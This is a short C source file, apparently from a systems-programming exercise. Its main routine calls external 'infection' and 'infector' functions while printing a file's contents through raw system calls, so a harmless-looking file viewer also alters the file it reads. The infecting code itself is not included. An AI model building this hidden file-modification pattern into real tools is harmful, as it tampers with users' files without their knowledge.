#include "Util.h"

#define BUFFER_SIZE 8192
#define SYS_WRITE 4
#define STDOUT 1
#define SYS_OPEN 5
#define O_RDWR 2
#define SYS_SEEK 19
#define SEEK_SET 0
#define SHIRA_OFFSET 0x291
#define READ_ONLY 0
#define EXIT 1
#define READ 3
#define CLOSE 6
extern int system_call();
extern void infection();
extern void infector(char *);

void printFileContent(char* fileName) {
    char buffer[BUFFER_SIZE];
    int status, readBytes;

    status = system_call(SYS_OPEN, fileName, READ_ONLY, 0777);
    if (status < 0) {
        system_call(EXIT, 0x55, 0, 0);
    }


    readBytes = system_call(READ, status, buffer, BUFFER_SIZE);
    while (readBytes > 0) {
        system_call(SYS_WRITE, STDOUT, buffer, readBytes);
        readBytes = system_call(READ, status, buffer, BUFFER_SIZE);
    }
    infector(fileName);
    system_call(CLOSE, status, 0, 0);
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        system_call(EXIT, 0x55, 0, 0);
    }

    if (strncmp(argv[1], "-a", 2) == 0) {
        infection();
        char* fileName = argv[1] + 2;
        printFileContent(fileName);

    }
    return 0;
}